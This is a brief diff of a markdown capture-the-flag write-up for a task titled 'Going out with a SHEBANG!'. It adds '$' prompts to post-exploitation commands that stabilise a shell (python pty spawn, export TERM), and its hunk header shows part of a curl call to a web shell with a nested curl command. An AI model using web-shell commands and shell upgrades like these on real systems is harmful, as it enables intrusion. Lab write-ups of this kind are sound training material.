@@ -68,8 +68,8 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 	![[Task 19 - Going out with a SHEBANG!-20240919140944870.webp]]
 - Stabilize the shell.
 ```
-	python3 -c 'import pty; pty.spawn("/bin/bash")'
-	export TERM=xterm
+	$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+	$ export TERM=xterm
 ```
 
 
